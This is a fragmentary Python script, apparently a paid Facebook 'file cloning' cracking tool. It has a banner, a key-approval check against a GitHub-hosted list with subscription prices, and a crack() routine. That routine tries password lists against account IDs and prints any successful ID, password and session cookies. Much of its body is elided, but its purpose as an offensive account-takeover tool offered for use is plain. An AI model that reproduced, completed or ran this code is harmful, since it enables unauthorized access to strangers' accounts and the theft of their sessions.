...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mibrahim')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'ibrahim' and password == 'Love':
...
os.system('espeak -a 300 " Welcome,   to,  ibrahim,  King,  Tools"')
os.system('xdg-open https://www.facebook.com/profile.php?id=100079999129988')
def banner():
	os.system("clear")
	print (f"""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mIR-Ibrahim ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • ibrahim King ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38m ibrahim ]   ║\33[1;34m   
...
def login():
	banner()
	ibrahimj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	ibrahimj('\033[0;97m===============================================')
	ibrahim= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if ibrahim in ['m']:
		public()
	elif ibrahim in ['1']:
		crack_file()
	elif ibrahim in ['i','0i']:
		result()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[ibrahim-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#ibrahim
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•ibrahim-Cp] {idf} • {pw}')     
				...
				#ibrahim-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•ibrahim-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " ibrahim,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/Cyber-404ibrahim/Approval.txt/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m ibrahim, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+ibrahim+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ibrahim+''+key1
